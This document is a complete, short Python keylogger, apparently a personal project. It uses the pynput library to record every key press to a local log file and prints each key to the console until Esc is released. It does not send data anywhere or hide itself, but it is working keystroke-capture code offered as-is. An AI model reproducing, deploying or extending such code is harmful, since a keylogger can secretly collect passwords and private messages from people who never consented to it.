from pynput.keyboard import Key, Listener

filename = "the_keylogger_i_made_log.txt"
path = ""
extension = "\\"

count = 0
keys = []


def on_press(key):
    global keys, count
    keys.append(key)
    count += 1

    # reset
    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    fullpath = path + filename
    with open(fullpath, "a") as f:
        for key in keys:
            # get rid of annoying single quotes
            k = str(key).replace("'", "")
            print(k)
            if k.find("space") > 0:
                f.write('\n')
                f.close()

            # in the case of non-special characters, write them out as is
            elif k.find("Key") == -1:
                f.write(k)
                f.close()

            else:
                f.write(k.replace("Key.", "\n"))
                f.close()


def on_release(key):
    if key == Key.esc:
        return False


if __name__ == "__main__":
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
